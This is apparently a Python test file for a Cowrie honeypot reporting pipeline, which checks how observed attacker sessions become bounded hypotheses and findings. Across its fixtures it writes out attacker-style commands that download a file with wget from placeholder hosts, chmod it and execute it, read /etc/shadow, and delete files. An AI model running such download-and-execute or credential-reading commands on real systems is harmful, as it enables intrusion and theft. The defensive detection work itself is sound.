"""Observed Cowrie command input can support a bounded, non-canonical hypothesis."""

from __future__ import annotations

from production.reporting.typed_semantic_chain_selection import (
    chronology_quality_for_fact_set,
    select_typed_semantic_chains,
)
from tests.test_cross_family_relationship_evaluation import _build
from tests.test_transfer_family_migration import (
    GUIDANCE_POLICY, _payload, _report, _transfer_event, _typed_inputs,
)


RULE = {
    "rule_id": "typed-transfer-permission-execution",
    "required_operation_types": [
        "transfer_attempt", "permission_modify", "execution_attempt"
    ],
    "minimum_incomplete_operation_count": 2,
    "allow_unconfirmed_incomplete_hypothesis": True,
}


def _case(name: str, events: list[tuple[str, str]]):
    return _build({"case_id": name, "events": events})


def test_same_path_input_only_is_hypothesis_not_finding() -> None:
    facts, report = _case("input-only", [
        ("wget https://example.invalid/payload.sh -O /tmp/payload.sh", "unknown"),
        ("chmod 700 /tmp/payload.sh", "unknown"),
    ])
    matches = select_typed_semantic_chains(facts, [RULE])["matches"]
    assert len(matches) == 1
    assert matches[0]["status"] == "incomplete"
    assert matches[0]["chronology_quality"] == "timestamp_supported"
    assert any("unconfirmed" in item.lower() for item in matches[0]["limitations"])
    assert report["behavioral_findings"] == []
    assert len(report["hypothesis_sets"]) == 1
    statement = report["hypothesis_sets"][0]["hypotheses"][0]["statement"]
    assert "completion and effects are not established" in statement


def test_two_distinct_artifact_chains_yield_two_evidence_bounded_sets() -> None:
    _facts, report = _case("two-distinct-paths", [
        ("wget http://example.org/a -O /tmp/pti_a.txt", "unknown"),
        ("chmod 700 /tmp/pti_a.txt", "unknown"),
        ("wget http://example.org/b -O /tmp/pti_b.txt", "unknown"),
        ("chmod 700 /tmp/pti_b.txt", "unknown"),
    ])
    sets = report["hypothesis_sets"]
    assert len(sets) == 2
    assert len({item["hypothesis_set_id"] for item in sets}) == 2
    assert len({item["relationship_refs"][0] for item in sets}) == 2
    assert report["behavioral_findings"] == []


def test_transfer_follow_on_and_credential_access_are_distinct_topics() -> None:
    _facts, report = _case("transfer-and-credential", [
        ("wget http://example.org/a -O /tmp/pti_a.txt", "unknown"),
        ("chmod 700 /tmp/pti_a.txt", "unknown"),
        ("cat /etc/shadow", "success"),
    ])
    sets = report["hypothesis_sets"]
    assert len(sets) == 2
    assert {item["question"] for item in sets} == {
        "What explains the incomplete artifact-related behavior visible in this session?",
        "What explains the credential-related path access observed in this session?",
    }
    credential_set = next(
        item for item in sets
        if item["scope"] == "bounded_cowrie_credential_path_access"
    )
    assert credential_set["basis_finding_ids"]
    assert any(
        item.get("semantic_family") == "sensitive_read"
        for item in report["behavioral_findings"]
    )
    assert report["session_hypothesis_assessment"]["follow_on_hypothesis"]["status"] == "selected"


def test_two_inspection_types_before_bound_download_add_third_topic() -> None:
    session = "inspection-transfer-credential"
    report = _report(_payload(
        session,
        commands=[
            ("id", "unknown", ""),
            ("uname -a", "unknown", ""),
            ("wget https://example.invalid/a -O /tmp/a", "unknown", ""),
            ("chmod 700 /tmp/a", "unknown", ""),
            ("cat /etc/shadow", "unknown", ""),
        ],
        transfer_events=[_transfer_event(session, index=5, path="/tmp/a")],
    ))
    sets = report["hypothesis_sets"]
    assert len(sets) == 3
    assert {item["scope"] for item in sets} == {
        "bounded_cowrie_observable_behavior",
        "bounded_cowrie_credential_path_access",
        "bounded_cowrie_inspection_before_transfer",
    }
    inspection = next(
        item for item in sets
        if item["scope"] == "bounded_cowrie_inspection_before_transfer"
    )
    assert len(inspection["basis_fact_ids"]) == 3
    assert len(inspection["hypotheses"][0]["supporting_evidence_refs"]) >= 3
    assert "whether those inspections informed the transfer is not established" in (
        inspection["hypotheses"][0]["statement"]
    )
    assert not any(
        item.get("finding_type") == "inspection_before_transfer"
        for item in report["behavioral_findings"]
    )


def test_two_distinct_remote_requests_without_direct_receipts_are_bounded() -> None:
    session = "two-unverified-urls"
    commands = [
        ("wget https://example.invalid/a -O /tmp/a", "unknown", ""),
        ("wget https://example.invalid/b -O /tmp/b", "unknown", ""),
    ]
    report = _report(_payload(session, commands=commands))
    sets = [
        item for item in report["hypothesis_sets"]
        if item["scope"] == "bounded_cowrie_unverified_remote_content"
    ]
    assert len(sets) == 1
    assert len(sets[0]["basis_fact_ids"]) == 2
    assert "completion is unverified" in sets[0]["hypotheses"][0]["statement"]
    assert report["behavioral_findings"] == []

    with_receipt = _report(_payload(
        session + "-receipt", commands=commands,
        transfer_events=[_transfer_event(
            session + "-receipt", index=3, path="/tmp/a",
            url="https://example.invalid/a",
        )],
    ))
    remaining = next(
        item for item in with_receipt["hypothesis_sets"]
        if item["scope"] == "bounded_cowrie_unverified_remote_content"
    )
    assert len(remaining["basis_fact_ids"]) == 1
    one_request = _report(_payload(
        session + "-one", commands=commands[:1]
    ))
    one_request_set = next(
        item for item in one_request["hypothesis_sets"]
        if item["scope"] == "bounded_cowrie_unverified_remote_content"
    )
    assert len(one_request_set["basis_fact_ids"]) == 1
    assert "a remote-content request command was observed" in (
        one_request_set["hypotheses"][0]["statement"].lower()
    )


def test_bound_download_then_same_path_execution_attempt_is_separate_topic() -> None:
    session = "download-then-execution"
    payload = _payload(
        session,
        commands=[
            ("wget https://example.invalid/a -O /tmp/a", "unknown", ""),
            ("/tmp/a", "unknown", ""),
        ],
        transfer_events=[_transfer_event(
            session, index=1, path="/tmp/a", url="https://example.invalid/a"
        )],
    )
    payload["raw_events"] = [
        payload["raw_events"][0], payload["raw_events"][2],
        payload["raw_events"][1],
    ]
    report = _report(
        payload,
        response_guidance_policy_path=str(GUIDANCE_POLICY),
    )
    sets = [
        item for item in report["hypothesis_sets"]
        if item["scope"] == "bounded_cowrie_download_then_execution_attempt"
    ]
    assert len(sets) == 1
    assert len(sets[0]["basis_fact_ids"]) == 2
    assert "program completion and effects are not established" in (
        sets[0]["hypotheses"][0]["statement"]
    )

    hashed_store = _payload(
        session + "-hashed-store",
        commands=[
            ("wget https://example.invalid/a -O /tmp/a", "unknown", ""),
            ("sh /tmp/a", "unknown", ""),
        ],
        transfer_events=[_transfer_event(
            session + "-hashed-store",
            index=1,
            path="var/lib/cowrie/downloads/" + "d" * 64,
            url="https://example.invalid/a",
        )],
    )
    hashed_store["raw_events"] = [
        hashed_store["raw_events"][0], hashed_store["raw_events"][2],
        hashed_store["raw_events"][1],
    ]
    hashed_report = _report(hashed_store)
    hashed_sets = [
        item for item in hashed_report["hypothesis_sets"]
        if item["scope"] == "bounded_cowrie_download_then_execution_attempt"
    ]
    assert len(hashed_sets) == 1
    assert len(hashed_sets[0]["basis_fact_ids"]) == 3

    wrong_path = _payload(
        session + "-wrong-path",
        commands=[
            ("wget https://example.invalid/a -O /tmp/a", "unknown", ""),
            ("/tmp/b", "unknown", ""),
        ],
        transfer_events=[_transfer_event(
            session + "-wrong-path", index=1, path="/tmp/a",
            url="https://example.invalid/a",
        )],
    )
    wrong_path["raw_events"] = [
        wrong_path["raw_events"][0], wrong_path["raw_events"][2],
        wrong_path["raw_events"][1],
    ]
    negative = _report(wrong_path)
    assert not any(
        item["scope"] == "bounded_cowrie_download_then_execution_attempt"
        for item in negative["hypothesis_sets"]
    )


def test_all_current_hypothesis_scopes_can_coexist_in_one_session() -> None:
    session = "all-hypothesis-scopes-one-session"
    payload = _payload(
        session,
        commands=[
            ("id", "unknown", ""),
            ("uname -a", "unknown", ""),
            ("wget https://example.invalid/direct -O /tmp/direct.bin", "unknown", ""),
            ("/tmp/direct.bin", "unknown", ""),
            ("wget https://example.invalid/attempt-a -O /tmp/attempt-a.bin", "unknown", ""),
            ("chmod 700 /tmp/attempt-a.bin", "unknown", ""),
            ("wget https://example.invalid/attempt-b -O /tmp/attempt-b.bin", "unknown", ""),
            ("wget https://example.invalid/attempt-c -O /tmp/attempt-c.bin", "unknown", ""),
            ("cat /etc/shadow", "unknown", ""),
            ("chmod 600 /tmp/remove-me.bin", "unknown", ""),
            ("rm -f /tmp/remove-me.bin", "unknown", ""),
            ("cat /var/www/legacy-erp/config.php", "unknown", ""),
        ],
        transfer_events=[_transfer_event(
            session,
            index=3,
            path="/tmp/direct.bin",
            url="https://example.invalid/direct",
        )],
    )
    # Put the Cowrie download event between its command and the later execution
    # input so the test exercises a bound, ordered transfer-to-execution pair.
    command_events = [
        event for event in payload["raw_events"]
        if event.get("eventid") == "cowrie.command.input"
    ]
    transfer_event = next(
        event for event in payload["raw_events"]
        if event.get("eventid") == "cowrie.session.file_download"
    )
    login_events = [
        {
            "session": session,
            "src_ip": payload["src_ip"],
            "timestamp": f"2026-07-30T02:59:5{index}Z",
            "eventid": eventid,
        }
        for index, eventid in enumerate((
            "cowrie.login.failed",
            "cowrie.login.failed",
            "cowrie.login.success",
        ), start=7)
    ]
    payload["raw_events"] = [
        {
            "session": session,
            "src_ip": payload["src_ip"],
            "timestamp": "2026-07-30T02:59:56Z",
            "eventid": "cowrie.deception.decoy_placed",
            "path": "/var/www/legacy-erp/config.php",
            "phase": "INSTALLATION",
            "content_type": "config",
            "placement_type": "file",
        },
        *login_events,
        *command_events[:3], transfer_event, *command_events[3:]
    ]

    report = _report(
        payload,
        response_guidance_policy_path=str(GUIDANCE_POLICY),
    )
    scopes = {item["scope"] for item in report["hypothesis_sets"]}
    assert scopes == {
        "bounded_cowrie_observable_behavior",
        "bounded_cowrie_credential_path_access",
        "bounded_cowrie_inspection_before_transfer",
        "bounded_cowrie_unverified_remote_content",
        "bounded_cowrie_download_then_execution_attempt",
        "bounded_cowrie_failed_login_then_success",
        "bounded_cowrie_file_change_then_remove",
        "bounded_cowrie_deception_path_interaction",
    }
    assert len(report["hypothesis_sets"]) >= len(scopes)
    assert all(item["hypotheses"] for item in report["hypothesis_sets"])
    guidance_rules = {
        item["rule_id"]
        for item in report["response_guidance_v3"]["advisory_actions"]
    }
    assert {
        "review-failed-login-then-success",
        "review-unverified-remote-content",
        "review-download-execution-attempt",
        "review-file-change-then-remove",
        "review-deception-path-interaction",
    }.issubset(guidance_rules)
    file_change_actions = [
        item for item in report["response_guidance_v3"]["advisory_actions"]
        if item["rule_id"] == "review-file-change-then-remove"
    ]
    assert len(file_change_actions) == 1
    assert "/tmp/remove-me.bin" in file_change_actions[0]["description"]
    assert file_change_actions[0]["description"].count("/tmp/remove-me.bin") == 1
    assert "/var/www/legacy-erp/config.php" not in file_change_actions[0]["description"]


def test_failed_login_then_success_and_file_change_remove_are_bounded() -> None:
    session = "authentication-and-file-removal"
    payload = _payload(
        session,
        commands=[
            ("chmod 700 /tmp/changed.bin", "unknown", ""),
            ("rm -f /tmp/changed.bin", "unknown", ""),
        ],
        attck_only=True,
    )
    payload["raw_events"] = [
        {
            "session": session,
            "src_ip": payload["src_ip"],
            "timestamp": "2026-07-30T02:59:57Z",
            "eventid": "cowrie.login.failed",
        },
        {
            "session": session,
            "src_ip": payload["src_ip"],
            "timestamp": "2026-07-30T02:59:58Z",
            "eventid": "cowrie.login.failed",
        },
        {
            "session": session,
            "src_ip": payload["src_ip"],
            "timestamp": "2026-07-30T02:59:59Z",
            "eventid": "cowrie.login.success",
        },
        *payload["raw_events"],
    ]
    report = _report(payload)
    scopes = {item["scope"] for item in report["hypothesis_sets"]}
    assert "bounded_cowrie_failed_login_then_success" in scopes
    assert "bounded_cowrie_file_change_then_remove" in scopes
    authentication = next(
        item for item in report["hypothesis_sets"]
        if item["scope"] == "bounded_cowrie_failed_login_then_success"
    )
    assert "does not establish brute-force activity" in (
        authentication["hypotheses"][1]["statement"]
    )
    removal = next(
        item for item in report["hypothesis_sets"]
        if item["scope"] == "bounded_cowrie_file_change_then_remove"
    )
    assert "does not establish trace removal" in (
        removal["hypotheses"][1]["statement"]
    )


def test_new_hypotheses_abstain_without_required_sequence() -> None:
    session = "authentication-file-removal-negative"
    payload = _payload(
        session,
        commands=[
            ("chmod 700 /tmp/a", "unknown", ""),
            ("rm -f /tmp/b", "unknown", ""),
        ],
        attck_only=True,
    )
    payload["raw_events"] = [
        {
            "session": session,
            "src_ip": payload["src_ip"],
            "timestamp": "2026-07-30T02:59:58Z",
            "eventid": "cowrie.login.failed",
        },
        {
            "session": session,
            "src_ip": payload["src_ip"],
            "timestamp": "2026-07-30T02:59:59Z",
            "eventid": "cowrie.login.success",
        },
        *payload["raw_events"],
    ]
    report = _report(payload)
    scopes = {item["scope"] for item in report["hypothesis_sets"]}
    assert "bounded_cowrie_failed_login_then_success" not in scopes
    assert "bounded_cowrie_file_change_then_remove" not in scopes


def test_placed_deception_path_then_read_is_bounded_and_guided() -> None:
    session = "placed-deception-read"
    payload = _payload(
        session,
        commands=[("cat /var/www/legacy-erp/config.php", "unknown", "")],
        attck_only=True,
    )
    command_event = payload["raw_events"][0]
    payload["raw_events"] = [{
        "session": session,
        "src_ip": payload["src_ip"],
        "timestamp": "2026-07-30T02:59:59Z",
        "eventid": "cowrie.deception.decoy_placed",
        "path": "/var/www/legacy-erp/config.php",
        "phase": "INSTALLATION",
        "content_type": "config",
        "placement_type": "file",
    }, command_event]

    report = _report(
        payload,
        response_guidance_policy_path=str(GUIDANCE_POLICY),
    )
    deception = [
        item for item in report["hypothesis_sets"]
        if item["scope"] == "bounded_cowrie_deception_path_interaction"
    ]
    assert len(deception) == 1
    assert len(deception[0]["basis_fact_ids"]) == 1
    assert "same session referenced that exact path for read" in (
        deception[0]["hypotheses"][0]["statement"]
    )
    assert deception[0]["hypotheses"][0]["artifact_paths"] == [
        "/var/www/legacy-erp/config.php"
    ]
    assert deception[0]["hypotheses"][1]["artifact_paths"] == []
    assert any(
        item["rule_id"] == "review-deception-path-interaction"
        for item in report["response_guidance_v3"]["advisory_actions"]
    )


def test_distinct_deception_paths_produce_distinct_bound_actions() -> None:
    session = "two-placed-deception-paths"
    paths = ["/var/www/legacy-erp/config.php", "/tmp/backup_exfil/manifest.txt"]
    payload = _payload(
        session,
        commands=[(f"cat {path}", "unknown", "") for path in paths],
        attck_only=True,
    )
    command_events = list(payload["raw_events"])
    payload["raw_events"] = [
        {
            "session": session,
            "src_ip": payload["src_ip"],
            "timestamp": f"2026-07-30T02:59:5{index}Z",
            "eventid": "cowrie.deception.decoy_placed",
            "path": path,
            "phase": "INSTALLATION",
            "content_type": "config",
            "placement_type": "file",
        }
        for index, path in enumerate(paths, start=7)
    ] + command_events

    report = _report(
        payload,
        response_guidance_policy_path=str(GUIDANCE_POLICY),
    )
    deception_sets = [
        item for item in report["hypothesis_sets"]
        if item["scope"] == "bounded_cowrie_deception_path_interaction"
    ]
    deception_actions = [
        item for item in report["response_guidance_v3"]["advisory_actions"]
        if item["rule_id"] == "review-deception-path-interaction"
    ]
    assert len(deception_sets) == 2
    assert {
        tuple(item["hypotheses"][0]["artifact_paths"])
        for item in deception_sets
    } == {(paths[0],), (paths[1],)}
    assert len(deception_actions) == 2
    assert len({item["action_id"] for item in deception_actions}) == 2
    assert {
        frozenset(item["evidence_refs"]) for item in deception_actions
    } == {
        frozenset(item["hypotheses"][0]["supporting_evidence_refs"])
        for item in deception_sets
    }


def test_deception_hypothesis_requires_placed_event_exact_path_and_order() -> None:
    session = "deception-negative-gates"

    def scopes_for(path: str, placement_time: str | None) -> set[str]:
        payload = _payload(
            session + path.replace("/", "-"),
            commands=[("cat /etc/decoy.conf", "unknown", "")],
            attck_only=True,
        )
        if placement_time:
            payload["raw_events"].insert(0, {
                "session": payload["session_id"],
                "src_ip": payload["src_ip"],
                "timestamp": placement_time,
                "eventid": "cowrie.deception.decoy_placed",
                "path": path,
                "phase": "INSTALLATION",
                "content_type": "config",
                "placement_type": "file",
            })
        return {item["scope"] for item in _report(payload)["hypothesis_sets"]}

    assert "bounded_cowrie_deception_path_interaction" not in scopes_for(
        "/etc/not-the-decoy.conf", "2026-07-30T02:59:59Z"
    )
    assert "bounded_cowrie_deception_path_interaction" not in scopes_for(
        "/etc/decoy.conf", "2026-07-30T03:00:10Z"
    )
    assert "bounded_cowrie_deception_path_interaction" not in scopes_for(
        "/etc/decoy.conf", None
    )
    before_download = _payload(
        session + "-wrong-order",
        commands=[
            ("/tmp/a", "unknown", ""),
            ("wget https://example.invalid/a -O /tmp/a", "unknown", ""),
        ],
        transfer_events=[_transfer_event(
            session + "-wrong-order", index=2, path="/tmp/a",
            url="https://example.invalid/a",
        )],
    )
    negative = _report(before_download)
    assert not any(
        item["scope"] == "bounded_cowrie_download_then_execution_attempt"
        for item in negative["hypothesis_sets"]
    )


def test_login_and_deception_events_from_another_session_are_ignored() -> None:
    session = "session-A"
    payload = _payload(
        session,
        commands=[("cat /etc/decoy.conf", "unknown", "")],
        attck_only=True,
    )
    command_event = payload["raw_events"][0]
    payload["raw_events"] = [
        {
            "session": "session-B",
            "src_ip": "198.51.100.2",
            "timestamp": "2026-07-30T02:59:58Z",
            "eventid": "cowrie.deception.decoy_placed",
            "path": "/etc/decoy.conf",
        },
        command_event,
    ]
    report = _report(payload)
    assert not any(
        item["scope"] == "bounded_cowrie_deception_path_interaction"
        for item in report["hypothesis_sets"]
    )

    login_payload = _payload(session, commands=[], attck_only=True)
    login_payload["raw_events"] = [
        {
            "session": "session-B",
            "timestamp": "2026-07-30T02:59:57Z",
            "eventid": "cowrie.login.failed",
        },
        {
            "session": "session-B",
            "timestamp": "2026-07-30T02:59:58Z",
            "eventid": "cowrie.login.failed",
        },
        {
            "session": "session-B",
            "timestamp": "2026-07-30T02:59:59Z",
            "eventid": "cowrie.login.success",
        },
    ]
    login_report = _report(login_payload)
    assert not any(
        item["scope"] == "bounded_cowrie_failed_login_then_success"
        for item in login_report["hypothesis_sets"]
    )


def test_inspection_sequence_abstains_without_distinct_preceding_observations() -> None:
    cases = [
        ([("id", "unknown", "")], [_transfer_event("one-inspection", index=2)]),
        ([("id", "unknown", ""), ("id -u", "unknown", "")], [_transfer_event("same-inspection", index=3)]),
        ([("id", "failure", ""), ("uname -a", "unknown", "")], [_transfer_event("failed-inspection", index=3)]),
        ([("id", "unknown", ""), ("uname -a", "unknown", "")], []),
        ([("id", "unknown", ""), ("uname -a", "unknown", "")], [_transfer_event("upload-only", index=3, eventid="cowrie.session.file_upload")]),
    ]
    for index, (commands, transfers) in enumerate(cases):
        session = ("one-inspection", "same-inspection", "failed-inspection", "no-transfer", "upload-only")[index]
        report = _report(_payload(session, commands=commands, transfer_events=transfers))
        assert not any(
            item["scope"] == "bounded_cowrie_inspection_before_transfer"
            for item in report["hypothesis_sets"]
        )


def test_credential_attempt_hypothesis_is_noncanonical_and_bounded() -> None:
    _facts, report = _case(
        "credential-attempt", [("cat /etc/shadow", "unknown")]
    )
    credential_set = next(
        item for item in report["hypothesis_sets"]
        if item.get("scope") == "bounded_cowrie_credential_path_access"
    )
    assert credential_set["question"] == (
        "What explains the credential-related path access attempt in this session?"
    )
    assert credential_set["outcome_status"] == "outcome_unknown"
    assert credential_set["basis_finding_ids"] == []
    assert credential_set["basis_fact_ids"]
    assert "completion and access to content are not established" in (
        credential_set["hypotheses"][0]["statement"]
    )
    assert not any(
        item.get("semantic_family") == "sensitive_read"
        for item in report["behavioral_findings"]
    )
    assert report["session_hypothesis_assessment"]["follow_on_hypothesis"]["status"] == "abstained"


def test_credential_hypothesis_rejects_noncredential_and_failed_reads() -> None:
    for command, outcome in [
        ("cat /etc/passwd", "success"),
        ("cat /etc/shadow", "failure"),
    ]:
        _facts, report = _case("credential-negative", [(command, outcome)])
        assert not any(
            item.get("scope") == "bounded_cowrie_credential_path_access"
            for item in report["hypothesis_sets"]
        )


def test_failed_prerequisite_wrong_path_and_missing_prerequisite_abstain() -> None:
    for name, events in [
        ("failed-transfer", [
            ("wget https://example.invalid/a -O /tmp/a", "failure"),
            ("chmod 700 /tmp/a", "unknown"),
        ]),
        ("wrong-path", [
            ("wget https://example.invalid/a -O /tmp/a", "unknown"),
            ("chmod 700 /tmp/b", "unknown"),
        ]),
        ("no-transfer", [("chmod 700 /tmp/a", "unknown")]),
    ]:
        facts, report = _case(name, events)
        assert select_typed_semantic_chains(facts, [RULE])["matches"] == []
        expected = (
            {"bounded_cowrie_unverified_remote_content"}
            if name == "wrong-path" else set()
        )
        assert {item["scope"] for item in report["hypothesis_sets"]} == expected


def test_unconfirmed_complete_chain_does_not_become_finding_or_hypothesis() -> None:
    facts, report = _case("all-input", [
        ("wget https://example.invalid/a -O /tmp/a", "unknown"),
        ("chmod 700 /tmp/a", "unknown"),
        ("/tmp/a", "unknown"),
    ])
    assert select_typed_semantic_chains(facts, [RULE])["matches"] == []
    assert report["behavioral_findings"] == []
    assert [item["scope"] for item in report["hypothesis_sets"]] == [
        "bounded_cowrie_unverified_remote_content"
    ]


def test_reported_success_still_uses_existing_complete_finding_gate() -> None:
    _facts, report = _case("confirmed-chain", [
        ("wget https://example.invalid/a -O /tmp/a", "success"),
        ("chmod 700 /tmp/a", "success"),
        ("/tmp/a", "success"),
    ])
    assert [item["finding_type"] for item in report["behavioral_findings"]] == [
        "connected_transfer_permission_execution"
    ]
    assert [item["scope"] for item in report["hypothesis_sets"]] == [
        "bounded_cowrie_unverified_remote_content"
    ]


def test_direct_transfer_and_observed_chmod_keep_distinct_authorities() -> None:
    session = "direct-transfer-then-input"
    report = _report(_payload(
        session,
        commands=[
            ("wget https://example.invalid/a -O /var/tmp/observed.bin", "unknown", ""),
            ("chmod 700 /var/tmp/observed.bin", "unknown", ""),
        ],
        transfer_events=[_transfer_event(session, index=1)],
    ))
    assert any(
        finding.get("semantic_family") == "transfer"
        for finding in report["behavioral_findings"]
    )
    assert len(report["hypothesis_sets"]) == 1
    assert "completion and effects are not established" in (
        report["hypothesis_sets"][0]["hypotheses"][0]["statement"]
    )


def test_interleaved_direct_transfer_uses_raw_event_order_not_command_counter() -> None:
    session = "interleaved-transfer-then-chmod"
    payload = _payload(
        session,
        commands=[
            ("pwd", "unknown", ""),
            ("ls", "unknown", ""),
            ("wget https://example.invalid/a -O /var/tmp/observed.bin", "unknown", ""),
            ("chmod 700 /var/tmp/observed.bin", "unknown", ""),
        ],
        transfer_events=[_transfer_event(session, index=3)],
    )
    command_events = payload["raw_events"][:4]
    command_events[3]["timestamp"] = "2026-07-30T03:00:04Z"
    preceding_events = [
        {
            "session": session,
            "src_ip": payload["src_ip"],
            "timestamp": f"2026-07-30T02:59:5{index}Z",
            "eventid": "cowrie.client.version",
        }
        for index in range(3)
    ]
    payload["raw_events"] = [
        *preceding_events,
        *command_events[:3],
        payload["raw_events"][4],
        command_events[3],
    ]
    _observed, facts, _selection = _typed_inputs(payload)
    assert chronology_quality_for_fact_set(facts)["quality"] == "timestamp_supported"
    matches = select_typed_semantic_chains(facts, [RULE])["matches"]
    assert len(matches) == 1
    assert matches[0]["status"] == "incomplete"
    report = _report(payload)
    assert len(report["hypothesis_sets"]) == 1
    assert not any(
        finding.get("finding_type") == "connected_transfer_permission_execution"
        for finding in report["behavioral_findings"]
    )
